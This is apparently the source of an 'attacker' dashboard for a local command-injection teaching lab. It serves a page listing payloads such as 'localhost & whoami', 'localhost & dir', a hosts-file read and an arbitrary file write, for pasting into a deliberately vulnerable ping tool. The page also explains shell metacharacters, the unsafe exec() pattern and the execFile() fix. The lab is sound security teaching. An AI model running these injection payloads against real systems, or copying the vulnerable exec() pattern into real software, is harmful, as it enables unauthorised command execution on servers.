/*
 * Terminal 2: cd demo-attacked/command-injection && npm run attacker
 */

const express = require('express');

const app = express();
const PORT = 3038;
const VICTIM_PORT = 3037;
const PROTECTED_PORT = 3039;

const PAYLOADS = [
  { id: 'p0', payload: 'localhost', desc: 'Baseline — normal ping (benign)' },
  { id: 'p1', payload: 'localhost & whoami', desc: 'Appends whoami — reveals server OS user' },
  { id: 'p2', payload: 'localhost & dir', desc: 'Lists current directory (Windows)' },
  { id: 'p3', payload: 'localhost & type C:\\Windows\\System32\\drivers\\etc\\hosts', desc: 'Reads hosts file' },
  { id: 'p4', payload: 'localhost & ipconfig', desc: 'Reveals network interfaces' },
  { id: 'p5', payload: 'localhost & echo PWNED > C:\\Temp\\pwned.txt', desc: 'Writes arbitrary file' },
];

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #dc2626;
      color: #fff;
      border-color: #dc2626;
    }
    .target-switcher .btn-protected.active {
      background: #ef4444;
      color: #fff;
      border-color: #ef4444;
    }`;

const DASHBOARD_STYLE = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    ${SWITCHER_CSS}`;

const LAB_EXTRA_STYLE = `
    .code-panel {
      background: #111;
      border-left: 3px solid #00ff41;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
      font-size: 0.82rem;
      line-height: 1.7;
      white-space: pre-wrap;
      word-break: break-all;
    }
    input.field {
      background: #111;
      border: 1px solid #1a3a1a;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 0.82rem;
      padding: 0.4rem 0.6rem;
      border-radius: 4px;
    }
    #live-output {
      margin-top: 1rem;
      padding: 1rem;
      background: #0d0d0d;
      color: #e2e8f0;
      border: 1px solid #1a3a1a;
      border-radius: 4px;
      font-size: 0.8rem;
      white-space: pre-wrap;
      word-break: break-all;
      min-height: 100px;
    }`;

function buildPayloadRows() {
  return PAYLOADS.map(function (row) {
    return (
      '<tr>' +
        '<td><code id="' + row.id + '">' + row.payload + '</code></td>' +
        '<td>' + row.desc + '</td>' +
        '<td><button type="button" class="demo-btn btn-copy" data-target="' + row.id + '">Copy</button></td>' +
      '</tr>'
    );
  }).join('');
}

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Command Injection Attack Lab</title>
  <style>${DASHBOARD_STYLE}${LAB_EXTRA_STYLE}</style>
</head>
<body>
  <h1>⚡ Command Injection Attack Lab — NetProbe (Port ${VICTIM_PORT})</h1>
  <p class="subtitle">child_process.exec() + unsanitized input = arbitrary OS commands</p>

  <div class="credentials-panel">
    <h2>Credentials</h2>
    <table>
      <thead><tr><th>Field</th><th>Value</th></tr></thead>
      <tbody>
        <tr><td>Target URL</td><td>http://localhost:${VICTIM_PORT}</td></tr>
        <tr><td>Username</td><td>alice</td></tr>
        <tr><td>Password</td><td>alice123</td></tr>
      </tbody>
    </table>
    <p style="font-size:0.85rem;color:#94a3b8;margin-top:0.75rem;max-width:640px">
      Step: Login at localhost:${VICTIM_PORT} first to get a valid session.
    </p>
  </div>

  <div class="flow-box">
    <strong>💀 Attack Payloads</strong><br><br>
    Paste these into the Hostname field of the Ping tool at localhost:${VICTIM_PORT}.
    <table style="margin-top:1rem">
      <thead><tr><th>Payload</th><th>What it does</th><th></th></tr></thead>
      <tbody>${buildPayloadRows()}</tbody>
    </table>
    <p style="font-size:0.85rem;color:#94a3b8;margin-top:1rem;max-width:720px">
      If running on Linux/Mac use <code>ls</code> instead of <code>dir</code>,
      <code>cat /etc/hosts</code> instead of <code>type</code>,
      <code>ifconfig</code>/<code>ip a</code> instead of <code>ipconfig</code>.
    </p>
    <pre style="margin-top:1rem;font-size:0.82rem;color:#94a3b8">; or & — command separator: runs next command regardless of first result
&& — runs next command only if first succeeds
| — pipes stdout of first command as stdin to second
$(...) — command substitution: output replaces the expression</pre>
  </div>

  <div class="flow-box">
    <strong>🔍 Root Cause</strong><br><br>
    <div class="code-panel">const command = \`ping -n 4 \${hostname}\`;
exec(command, callback);
// If hostname = "localhost & whoami"
// Shell executes: ping -n 4 localhost & whoami
//                 ^^^^^^^^^^^^^^^^^^^^  ^^^^^^
//                   intended command    injected command</div>
    <div class="code-panel">exec(command, callback)
  │
  └─→ Passes command to OS shell (/bin/sh or cmd.exe)
      Shell interprets: ; &amp;&amp; | $() \` etc.
      These are SHELL METACHARACTERS
      They let the attacker chain arbitrary commands</div>
    <div class="code-panel">// SAFE: execFile() takes command + args as separate array
// Shell is never invoked — metacharacters are just text
const { execFile } = require('child_process');
execFile('ping', ['-n', '4', hostname], callback);

// hostname = "localhost &amp; whoami"
// ping receives: ["-n", "4", "localhost &amp; whoami"]
// The &amp; is just a string argument — ping tries to resolve it</div>
  </div>

  <div class="flow-box">
    <strong>🧪 Live Test</strong><br><br>
    <p style="font-size:0.85rem;color:#94a3b8;margin-bottom:0.75rem;max-width:640px">
      You must be logged in at localhost:${VICTIM_PORT} for these tests to work. They send to the VULNERABLE server.
    </p>
    <div style="margin-bottom:0.75rem;display:flex;gap:0.5rem;align-items:center">
      <label style="font-size:0.82rem;color:#94a3b8;white-space:nowrap">Session token from :${VICTIM_PORT} login:</label>
      <input class="field" id="session-token" style="flex:1" placeholder="Paste token here (copy from :${VICTIM_PORT} DevTools → Application → localStorage → authToken)">
    </div>
    <div class="demo-buttons">
      <button type="button" class="demo-btn" id="btn-test-safe">Test localhost (safe)</button>
      <button type="button" class="demo-btn" id="btn-test-inject">Test Injection</button>
    </div>
    <pre id="live-output">Response will appear here.</pre>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-switcher-protected">Protected (${PROTECTED_PORT})</button>
  </div>

  <script>
    document.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var id = btn.getAttribute('data-target');
        var text = document.getElementById(id).textContent;
        navigator.clipboard.writeText(text).then(function () {
          btn.textContent = 'Copied!';
          setTimeout(function () { btn.textContent = 'Copy'; }, 1500);
        });
      });
    });

    function showResult(msg) {
      document.getElementById('live-output').textContent = msg;
    }

    async function runLiveTest(hostname, port) {
      var token = document.getElementById('session-token').value.trim();
      if (!token) { showResult('Set a session token above first'); return; }
      try {
        var res = await fetch('http://localhost:' + port + '/api/ping', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
          body: JSON.stringify({ hostname: hostname })
        });
        var data = await res.json();
        document.getElementById('live-output').textContent = JSON.stringify(data, null, 2);
      } catch (e) {
        document.getElementById('live-output').textContent = 'Error: ' + e.message;
      }
    }

    document.getElementById('btn-test-safe').addEventListener('click', function () {
      runLiveTest('localhost', ${VICTIM_PORT});
    });
    document.getElementById('btn-test-inject').addEventListener('click', function () {
      runLiveTest('localhost & whoami', ${VICTIM_PORT});
    });

    document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
    });
    document.getElementById('btn-switcher-protected').addEventListener('click', function () {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('Command Injection Attack Lab running at http://localhost:' + PORT);
});
